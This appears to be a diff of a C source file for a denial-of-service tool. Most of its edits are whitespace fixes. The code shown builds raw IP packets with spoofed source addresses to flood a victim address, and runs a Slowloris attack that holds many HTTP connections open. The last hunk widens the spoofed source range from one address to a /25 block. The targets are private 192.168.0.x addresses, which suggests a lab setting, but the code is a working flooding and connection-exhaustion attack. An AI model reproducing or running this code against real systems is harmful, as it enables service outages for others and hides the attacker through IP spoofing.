@@ -80,13 +80,13 @@ void *flood(void *value)
     int one = 1;
     struct ifreq ifr;
     struct attack *packet = (struct attack *)value;
-    
-    
+
+
     if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
         perror("Error socket()");
         pthread_exit(NULL);
     }
-    
+
     memset (&ifr, 0, sizeof (ifr));
     strcpy(ifr.ifr_name, "enp3s0");
     if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
@@ -94,13 +94,13 @@ void *flood(void *value)
         pthread_exit(NULL);
     }
     printf ("Index for interface %i\n", ifr.ifr_ifindex);
-    
-    
+
+
     if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
          perror("Error: setsockopt()");
          pthread_exit(NULL);
     }
-    
+
     if (setsockopt(s, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof (ifr)) < 0) {
         perror ("setsockopt() failed to bind to interface ");
         pthread_exit(NULL);
@@ -118,7 +118,7 @@ void *flood(void *value)
         in_addr_t ip_src = ip_random(packet->ip_spoofed, packet->cidr_spoofed);
         uint16_t src_port = htons(randint(30000, 65535));
         uint16_t dst_port = htons(randint(1, 49151));
-	
+
         switch (packet->protocol) {
             case UDP_FLOOD:
                 length += sizeof(struct udphdr);
@@ -154,7 +154,7 @@ void *flood(void *value)
         ip->saddr = ip_src;
         ip->daddr = packet->ip_victim;
         ip->check = checksum(buffer, sizeof(struct iphdr));
-        
+
         //packet_dump(buffer,  ip->tot_len);
         sendto(s, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
     }
@@ -174,28 +174,28 @@ int restart_connection()
         "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
     };
-    
+
     struct sockaddr_in victim = {
         .sin_family = AF_INET,
         .sin_port = htons(80)
     };
     victim.sin_addr.s_addr = inet_addr("192.168.0.2");
-    
+
     int s;
     char buffer[HTTP_BUFFER];
-    
+
     if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         perror("Error socket()");
     }
     connect(s, (struct sockaddr *)&victim, sizeof(victim));
-    
+
     snprintf(buffer, HTTP_BUFFER, "GET /?%d HTTP/1.1\r\n", randint(0, 1000));
     send(s, buffer, strlen(buffer), 0);
     snprintf(buffer, HTTP_BUFFER, "User-Agent: %s\r\n", user_agents[rand() % 5]);
     send(s, buffer, strlen(buffer), 0);
     snprintf(buffer, HTTP_BUFFER, "Accept-language: sk-SK\r\n");
     send(s, buffer, strlen(buffer), 0);
-    
+
     return s;
 }
 
@@ -203,7 +203,7 @@ void *slow_lorris(void *value)
 {
     char buffer[HTTP_BUFFER];
     int sockets[SOCKETS_SLOWLORRIS / THREADS];
-    
+
     printf("Slow Lorris - connections: %d\n", SOCKETS_SLOWLORRIS / THREADS);
     for (int i = 0; i < SOCKETS_SLOWLORRIS / THREADS; i++)
         sockets[i] = restart_connection();
@@ -222,7 +222,7 @@ void *slow_lorris(void *value)
         }
         sleep(TIMEOUT);
     }
-    
+
      for (int i = 0; i < SOCKETS_SLOWLORRIS / THREADS; i++)
         close(sockets[i]);
 
@@ -235,8 +235,8 @@ int main(void)
 
     struct attack nodes = {
         .ip_victim = inet_addr("192.168.0.2"),
-        .ip_spoofed = inet_addr("192.168.0.5"),
-        .cidr_spoofed = 32,
+        .ip_spoofed = inet_addr("192.168.0.32"),
+        .cidr_spoofed = 25,
         .protocol = ATTACK
     };
 
